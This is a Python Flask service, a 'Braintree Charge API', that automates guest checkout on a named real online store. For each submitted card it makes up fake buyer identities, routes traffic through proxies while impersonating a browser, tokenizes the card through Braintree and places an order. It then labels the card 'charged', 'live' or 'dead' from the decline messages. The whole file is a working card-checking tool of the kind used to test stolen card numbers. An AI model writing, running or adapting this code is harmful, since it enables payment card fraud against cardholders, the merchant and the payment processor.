import os
import json
import time
import uuid
import base64
import random
import re
import requests
from flask import Flask, request, jsonify
from curl_cffi import requests as cfrequests

app = Flask(__name__)

# ── Configuration ────────────────────────────────────────────────────
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "30"))
UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36 EdgA/146.0.0.0'

SITE_URL = "https://buckmans.com"
PRODUCT_URL = f"{SITE_URL}/product/stickers/45050/buckmans-shield-sticker"
CHECKOUT_URL = f"{SITE_URL}/store/checkout/index.aspx"
REVIEW_URL = f"{SITE_URL}/store/checkout/review-order.aspx"
BRAINTREE_GRAPHQL = "https://payments.braintree-api.com/graphql"

# ── Utility functions ────────────────────────────────────────────────
def get_str(source, start, end):
    try: return source.split(start)[1].split(end)[0]
    except: return ""

def get_aspnet(page):
    d = {}
    for f in ['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION','__VIEWSTATEENCRYPTED']:
        val = get_str(page, f'id="{f}" value="', '"')
        if not val:
            val = get_str(page, f"id='{f}' value='", "'")
        if val: d[f] = val
    return d

def parse_card(card_raw):
    parts = re.split(r'[:|/ ]', card_raw.strip())
    if len(parts) < 4:
        raise ValueError("Invalid card format. Use cc|mm|yy|cvv")
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2: yy = "20" + yy
    if len(mm) == 1: mm = "0" + mm
    return cc, mm, yy, cvv

def extract_client_token_and_fingerprint(page):
    patterns = [
        ('clientToken = "', '"'),
        ("clientToken = '", "'"),
        ('authorization: "', '"'),
        ("authorization: '", "'"),
        ('client-token=', '&'),
        ('"clientToken":"', '"'),
    ]
    for start, end in patterns:
        token = get_str(page, start, end)
        if token: break
    if not token: return None
    try:
        padded = token + '=' * (-len(token) % 4)
        decoded = json.loads(base64.b64decode(padded).decode('utf-8'))
        fingerprint = decoded.get('authorizationFingerprint', '')
        if fingerprint: return fingerprint
    except: pass
    if token.startswith('eyJ') and '.' in token:
        return token
    return None

def get_error_message(page):
    err = get_str(page, 'id="ctl00_ctl00_ctl00_MainContent_Body_Body_CheckoutReview1_cvProcessingError"', '</span>')
    if err and "The transaction has been declined" not in err:
        return re.sub(r'<[^>]+>', '', err).strip()
    for pattern in ['class="error-message">', "class='error-message'>",
                    'class="error">', "class='error'>",
                    'class="alert">', "class='alert'>"]:
        alt = get_str(page, pattern, '</')
        if alt: return re.sub(r'<[^>]+>', '', alt).strip()
    return ""

def _normalize_proxy_url(proxy_str):
    if not proxy_str: return None
    raw = str(proxy_str).strip()
    if raw == "" or raw.lower() in {"direct", "none", "false", "off", "0"}: return None
    if "://" in raw: return raw
    return f"http://{raw}"

# ── Core charge logic (unchanged business flow) ──────────────────────
def do_charge(card_raw, proxy_url=None):
    start_time = time.time()
    session = None
    charge_amount = "Unknown"

    try:
        cc, mm, yy, cvv = parse_card(card_raw)
        proxy = _normalize_proxy_url(proxy_url)
        proxies = {"http": proxy, "https": proxy} if proxy else None

        session = cfrequests.Session(impersonate="chrome")
        first_name = random.choice(["James","Robert","John","Michael","William","David"])
        last_name = random.choice(["Smith","Johnson","Williams","Brown","Jones","Miller"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100,999)}@gmail.com"
        phone = f"713{random.randint(1000000,9999999)}"

        # 1. Homepage
        r = session.get(SITE_URL, proxies=proxies, timeout=REQUEST_TIMEOUT)
        if r.status_code != 200: return {"status":"error","response":f"Homepage {r.status_code}"}

        # 2. Add to cart
        r = session.get(PRODUCT_URL, proxies=proxies, timeout=REQUEST_TIMEOUT)
        fields = get_aspnet(r.text)
        options = re.findall(r'name="(ctl00[^"]*rblOptions[^"]*)"[^>]*value="([^"]*)"', r.text)
        if not options:
            options = re.findall(r"name='(ctl00[^']*rblOptions[^']*)'[^>]*value='([^']*)'", r.text)
        used_groups = set()
        for n, v in options:
            if n not in used_groups:
                fields[n] = v
                used_groups.add(n)
        fields['ctl00$ctl00$MainContent$Body$btnAddToCart'] = 'ADD TO CART'
        fields['ctl00$ctl00$MainContent$Body$txtQuantity'] = '1'
        fields['__EVENTTARGET'] = fields['__EVENTARGUMENT'] = ''
        r = session.post(PRODUCT_URL, data=fields, proxies=proxies, timeout=REQUEST_TIMEOUT)

        # 3. Guest checkout
        r = session.get(CHECKOUT_URL, proxies=proxies, timeout=REQUEST_TIMEOUT)
        fields = get_aspnet(r.text)
        fields['ctl00$ctl00$ctl00$MainContent$Body$Body$btnContinue'] = 'Continue as Guest'
        r = session.post(r.url, data=fields, proxies=proxies, timeout=REQUEST_TIMEOUT)

        # 4. Billing
        pfx = 'ctl00$ctl00$ctl00$MainContent$Body$Body$CheckoutAddresses1'
        fields = get_aspnet(r.text)
        fields['__LASTFOCUS'] = ''
        fields['__EVENTTARGET'] = fields['__EVENTARGUMENT'] = ''
        fields[f'{pfx}$AECCreditCard$txtFirstName'] = first_name
        fields[f'{pfx}$AECCreditCard$txtLastName'] = last_name
        fields[f'{pfx}$AECCreditCard$txtAddress1'] = '456 Oak Ave'
        fields[f'{pfx}$AECCreditCard$txtCity'] = 'Houston'
        fields[f'{pfx}$AECCreditCard$txtStateProvince'] = 'TX'
        fields[f'{pfx}$AECCreditCard$txtPostalCode'] = '77001'
        fields[f'{pfx}$AECCreditCard$ddlCountry'] = '225'
        fields[f'{pfx}$AECCreditCard$txtSimplePhone'] = phone
        fields[f'{pfx}$rptShippingAddresses$ctl00$chkSameAsBilling'] = 'on'
        fields[f'{pfx}$rptShippingAddresses$ctl00$AECShipping$ddlCountry'] = '225'
        fields[f'{pfx}$btnCheckOut'] = 'Continue'
        r = session.post(r.url, data=fields, proxies=proxies, timeout=REQUEST_TIMEOUT)
        if 'pfas' in r.url.lower():
            fields = get_aspnet(r.text)
            fields['__EVENTTARGET'] = fields['__EVENTARGUMENT'] = ''
            fields['ctl00$ctl00$ctl00$MainContent$Body$Body$btnProceedWithoutItems'] = 'Proceed'
            r = session.post(r.url, data=fields, proxies=proxies, timeout=REQUEST_TIMEOUT)

        # 5. Review page + token
        if 'review' not in r.url.lower():
            r = session.get(f"{REVIEW_URL}?guestcheckout=1", proxies=proxies, timeout=REQUEST_TIMEOUT)
        page = r.text
        total_match = re.search(r'(?:Order\s*Total|Grand\s*Total)[^$]*\$\s*([\d,.]+)', page, re.IGNORECASE)
        if total_match: charge_amount = f"${total_match.group(1)}"
        auth_fingerprint = extract_client_token_and_fingerprint(page)
        if not auth_fingerprint: return {"status":"error","response":"No Braintree token"}
        aspnet = get_aspnet(page)

        # 6. Tokenize card
        session_id = str(uuid.uuid4())
        device_data = json.dumps({"correlation_id": session_id})
        bt_headers = {
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': UA,
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'accept': '*/*',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
        }
        mutation = {
            "clientSdkMetadata": {"source":"client","integration":"dropin2","sessionId":session_id},
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
            "variables": {"input": {"creditCard": {"number":cc,"expirationMonth":mm,"expirationYear":yy,"cvv":cvv,"billingAddress":{"postalCode":"77001"}},"options":{"validate":False}}},
            "operationName": "TokenizeCreditCard"
        }
        r_bt = requests.post(BRAINTREE_GRAPHQL, json=mutation, headers=bt_headers, proxies=proxies, timeout=(15,25))
        bt_res = r_bt.json()
        if "errors" in bt_res:
            err = bt_res["errors"][0].get("message","Error")
            return {"status":"dead","response":f"Tokenization: {err}"}
        td = bt_res.get("data",{}).get("tokenizeCreditCard",{})
        nonce = td.get("token")
        ci = td.get("creditCard",{})
        brand = ci.get("brandCode","UNKNOWN")
        last4 = ci.get("last4",cc[-4:])
        bank = ci.get("binData",{}).get("issuingBank","Unknown")
        country = ci.get("binData",{}).get("countryOfIssuance","Unknown")
        if not nonce: return {"status":"error","response":"Empty nonce"}

        # 7. Submit order
        rpfx = 'ctl00$ctl00$ctl00$MainContent$Body$Body$CheckoutReview1'
        order_data = dict(aspnet)
        order_data['__LASTFOCUS'] = ''
        order_data['__EVENTTARGET'] = order_data['__EVENTARGUMENT'] = ''
        order_data[f'{rpfx}$Braintree1$txtNonce'] = nonce
        order_data[f'{rpfx}$Braintree1$txtDeviceData'] = device_data
        order_data[f'{rpfx}$Braintree1$txtPaymentType'] = 'CreditCard'
        order_data[f'{rpfx}$payment_type'] = 'Braintree'
        order_data[f'{rpfx}$txtEmail'] = email
        order_data[f'{rpfx}$btnSubmit'] = 'Place Order'
        r = session.post(f"{REVIEW_URL}?guestcheckout=1", data=order_data, proxies=proxies, timeout=REQUEST_TIMEOUT)
        resp = r.text
        resp_lower = resp.lower()
        err_clean = get_error_message(resp)

        base = {
            "time": f"{time.time()-start_time:.2f}s", "card": card_raw,
            "amount": charge_amount, "currency": "USD",
            "gateway": f"Braintree Charge {charge_amount}",
            "brand": brand, "last4": last4, "bank": bank, "country": country,
        }

        # Classification (original logic)
        if any(kw in resp_lower for kw in ["thank you","order confirmation","order complete","order has been placed","confirmation"]):
            return {**base, "status":"charged", "response":f"Charged {charge_amount} ✅"}

        if err_clean:
            err_low = err_clean.lower()
            if "insufficient" in err_low:
                return {**base, "status":"live", "response":f"Insufficient Funds → Live ✅"}
            if any(w in err_low for w in ["cvv","security code","cvc"]):
                return {**base, "status":"live", "response":f"CVV Mismatch ({err_clean}) → Live ✅"}
            if any(w in err_low for w in ["postal code","zip code","avs"]):
                return {**base, "status":"live", "response":f"AVS Failed ({err_clean}) → Live ✅"}
            if any(w in err_low for w in ["risk","threshold"]):
                return {**base, "status":"live", "response":f"Risk/Fraud ({err_clean}) → Live ✅"}
            dead_words = ["honor","declined","expired","pick up","lost","stolen","invalid card","restricted","no account","no credit"]
            for word in dead_words:
                if word in err_low:
                    return {**base, "status":"dead", "response":f"{err_clean} ❌"}

        if "insufficient funds" in resp_lower:
            return {**base, "status":"live", "response":"Insufficient Funds → Live ✅"}
        if "risk" in resp_lower or "threshold" in resp_lower:
            return {**base, "status":"live", "response":"Risk/Fraud → Live ✅"}

        return {**base, "status":"dead", "response":f"{err_clean if err_clean else 'Transaction Declined'} ❌"}

    except Exception as e:
        return {"status":"error","response":f"Error: {str(e)[:80]}",
                "time":f"{time.time()-start_time:.2f}s"}
    finally:
        if session:
            try: session.close()
            except: pass

# ── API endpoint (browser-friendly GET) ─────────────────────────────
@app.route('/braintree')
def braintree():
    card = request.args.get('cc', '').strip()
    if not card:
        return jsonify({"status":"error", "card_status":"error", "response":"Missing 'cc' parameter"}), 400

    proxy = request.args.get('proxy', None)

    # Run the charge process
    result = do_charge(card, proxy)

    # Map internal status to public card_status
    internal_status = result.get("status", "error")
    if internal_status in ("charged", "live"):
        card_status = "approved"
    elif internal_status == "dead":
        card_status = "declined"
    else:
        card_status = "error"

    # Build clean response
    return jsonify({
        "status": "success",              # API call succeeded
        "card_status": card_status,       # approved / declined / error
        "response": result.get("response", "No response")
    })

@app.route('/')
def home():
    return jsonify({"service":"Braintree Charge API","endpoint":"GET /braintree?cc=...&proxy=..."})

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
